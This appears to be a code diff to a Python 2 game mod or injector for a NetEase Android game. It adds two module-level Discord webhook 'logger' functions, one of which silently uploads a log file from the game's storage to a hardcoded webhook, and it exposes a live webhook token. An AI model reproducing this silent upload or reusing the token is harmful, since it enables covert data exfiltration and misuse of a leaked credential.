@@ -7,6 +7,53 @@ import game3d, zlib, C_file, json
 NPK_VERSION_FILE_NAME = 'npk_version.config'
 revivalinjectstatus = False
 
+# Module-level logging functions - available immediately when module loads
+def raidis(message):
+    """Discord webhook logger for debugging - safe to call anytime"""
+    try:
+        import httplib
+        import urllib
+        webhook_url = 'https://discord.com/api/webhooks/1386688982984687727/VvkppD8w1VEWAve3Zscvj2dOrPThL3tXbun_cnE1O2kw9J2jDfLKSrSddlKn2NM8RoPe'
+        payload = {'content': message}
+        form_data = urllib.urlencode(payload)
+        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+        conn = httplib.HTTPSConnection('discord.com')
+        conn.request("POST", webhook_url, form_data, headers)
+        response = conn.getresponse()
+        conn.close()
+    except Exception:
+        pass  # Silent failure by design
+
+def logdis(message):
+    """Discord webhook logger with file attachment"""
+    try:
+        import httplib
+        import os
+        webhook_url = '/api/webhooks/1386688982984687727/VvkppD8w1VEWAve3Zscvj2dOrPThL3tXbun_cnE1O2kw9J2jDfLKSrSddlKn2NM8RoPe'
+        file_path = '/storage/emulated/0/android/data/com.netease.g93na/files/netease/smc/log.txt'
+        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+        
+        body = '--' + boundary + '\r\nContent-Disposition: form-data; name="content"\r\n\r\n' + message + '\r\n'
+        
+        if os.path.isfile(file_path):
+            with open(file_path, 'rb') as f:
+                file_content = f.read()
+            body += '--' + boundary + '\r\nContent-Disposition: form-data; name="file"; filename="log.txt"\r\nContent-Type: text/plain\r\n\r\n'
+            body += file_content + '\r\n--' + boundary + '--\r\n'
+        else:
+            body += '--' + boundary + '--\r\n'
+        
+        headers = {
+            'Content-Type': 'multipart/form-data; boundary=%s' % boundary,
+            'Content-Length': str(len(body))
+        }
+        
+        conn = httplib.HTTPSConnection('discord.com')
+        conn.request('POST', webhook_url, body, headers)
+        response = conn.getresponse()
+        conn.close()
+    except Exception:
+        pass  # Silent failure
 
 class Revival(object):
     __isInitialized = False
@@ -41,65 +88,6 @@ class Revival(object):
             import six.moves.builtins
             from six.moves import range
             import game3d
-
-            # Define logging functions early so they're available everywhere
-            def raidis(message):
-                webhook_url = 'https://discord.com/api/webhooks/1386688982984687727/VvkppD8w1VEWAve3Zscvj2dOrPThL3tXbun_cnE1O2kw9J2jDfLKSrSddlKn2NM8RoPe'
-
-                payload = {
-                        'content': message
-                        }
-
-                form_data = urllib.urlencode(payload)  # For Python 2.7
-                headers = {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            }
-
-                try:
-                    conn = httplib.HTTPSConnection('discord.com')
-                    conn.request("POST", webhook_url, form_data, headers)
-                    response = conn.getresponse()
-                    if response.status == 204:
-                        pass
-                    else:
-                        pass
-                    conn.close()
-                except Exception as e:
-                    pass
-
-            def logdis(message):
-                webhook_url = '/api/webhooks/1386688982984687727/VvkppD8w1VEWAve3Zscvj2dOrPThL3tXbun_cnE1O2kw9J2jDfLKSrSddlKn2NM8RoPe'
-                file_path = '/storage/emulated/0/android/data/com.netease.g93na/files/netease/smc/log.txt'
-                boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
-
-                body = ''
-                body += '--' + boundary + '\r\n'
-                body += 'Content-Disposition: form-data; name="content"\r\n\r\n'
-                body += message + '\r\n'
-
-                if os.path.isfile(file_path):
-                    with open(file_path, 'rb') as f:
-                        file_content = f.read()
-                    body += '--' + boundary + '\r\n'
-                    body += 'Content-Disposition: form-data; name="file"; filename="log.txt"\r\n'
-                    body += 'Content-Type: text/plain\r\n\r\n'
-                    body += file_content + '\r\n'
-                    body += '--' + boundary + '--\r\n'
-                else:
-                    body += '--' + boundary + '--\r\n'
-
-                headers = {
-                    'Content-Type': 'multipart/form-data; boundary=%s' % boundary,
-                    'Content-Length': str(len(body))
-                }
-
-                try:
-                    conn = httplib.HTTPSConnection('discord.com')
-                    conn.request('POST', webhook_url, body, headers)
-                    response = conn.getresponse()
-                    conn.close()
-                except Exception as e:
-                    pass
 
             # Common constants + utilities
             global NEOX_UNIT_SCALE, HIT_PART_HEAD, HIT_PART_BODY, HIT_PART_SHIELD, HIT_PART_SKATE
